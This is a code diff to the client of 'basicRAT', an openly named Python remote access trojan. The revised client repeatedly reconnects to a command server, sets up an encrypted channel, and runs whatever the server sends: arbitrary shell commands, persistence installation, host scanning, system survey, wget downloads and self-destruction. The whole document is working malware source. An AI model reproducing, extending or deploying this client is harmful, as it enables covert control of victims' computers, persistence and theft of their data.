@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 #
 # basicRAT client
@@ -9,50 +8,40 @@
 import socket
 import subprocess
 import sys
+import time
 
-from core import common, crypto, persistence, scan, survey, toolkit
+from core import *
 
 
 # change these to suit your needs
 HOST = 'localhost'
 PORT = 1337
 
+# seconds to wait before client will attempt to reconnect
+CONN_TIMEOUT = 30
 
-def main():
-    # determine system platform
-    plat = sys.platform
-    if plat.startswith('win'):
-        plat = 'win'
-    elif plat.startswith('linux'):
-        plat = 'nix'
-    elif plat.startswith('darwin'):
-        plat = 'mac'
-    else:
-        plat = 'unk'
-    
-    # connect to basicRAT server
-    conn = socket.socket()
-    conn.connect((HOST, PORT))
-    client = common.Client(conn, HOST, 1)
+# determine system platform
+if sys.platform.startswith('win'):
+    PLAT = 'win'
+elif sys.platform.startswith('linux'):
+    PLAT = 'nix'
+elif sys.platform.startswith('darwin'):
+    PLAT = 'mac'
+else:
+    PLAT = 'unk'
 
+
+def client_loop(conn, dhkey):
     while True:
         results = ''
 
         # wait to receive data from server
-        data = client.recvGCM()
-
-        # don't process empty data
-        if not data:
-            continue
+        data = crypto.decrypt(conn.recv(4096), dhkey)
 
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
 
-        if cmd == 'download':
-            client.sendfile(action.rstrip())
-            continue
-
-        elif cmd == 'execute':
+        if cmd == 'execute':
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
@@ -62,34 +51,52 @@ def main():
             conn.close()
             sys.exit(0)
 
-        elif cmd == 'persistence':
-            results = persistence.run(plat)
+        elif cmd == 'goodbye':
+            conn.shutdown(socket.SHUT_RDWR)
+            conn.close()
+            break
 
-        # elif cmd == 'rekey':
-        #    client.dh_key = crypto.diffiehellman(client.conn)
-        #    continue
+        elif cmd == 'rekey':
+            dhkey = crypto.diffiehellman(conn)
+
+        elif cmd == 'persistence':
+            results = persistence.run(PLAT)
 
         elif cmd == 'scan':
             results = scan.single_host(action)
 
-        elif cmd == 'selfdestruct':
-            conn.close()
-            toolkit.selfdestruct(plat)
-
         elif cmd == 'survey':
-            results = survey.run(plat)
+            results = survey.run(PLAT)
 
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
 
-        elif cmd == 'upload':
-            client.recvfile(action.rstrip())
-            continue
-
         elif cmd == 'wget':
             results = toolkit.wget(action)
 
-        client.sendGCM(results)
+        elif cmd == 'selfdestruct':
+            conn.close()
+            toolkit.selfdestruct(PLAT)
+
+        results += '\n{} completed.'.format(cmd)
+
+        conn.send(crypto.encrypt(results, dhkey))
+
+
+def main():
+    while True:
+        conn = socket.socket()
+
+        try:
+            # attempt to connect to basicRAT server
+            conn.connect((HOST, PORT))
+        except socket.error:
+            time.sleep(CONN_TIMEOUT)
+            continue
+
+        dhkey = crypto.diffiehellman(conn)
+
+        client_loop(conn, dhkey)
 
 
 if __name__ == '__main__':
